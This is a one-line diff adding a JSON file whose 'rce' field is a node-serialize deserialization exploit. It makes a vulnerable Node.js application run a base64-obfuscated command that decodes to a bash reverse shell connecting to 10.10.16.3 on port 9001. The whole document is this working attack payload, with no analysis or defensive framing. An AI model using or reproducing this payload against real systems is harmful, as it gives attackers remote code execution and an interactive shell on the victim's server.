@@ -1,0 +1,1 @@
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzkwMDEgMD4mMQo=\" | base64 -d | bash', function(error, stdout, stderr){console.log(stdout)});}()"}
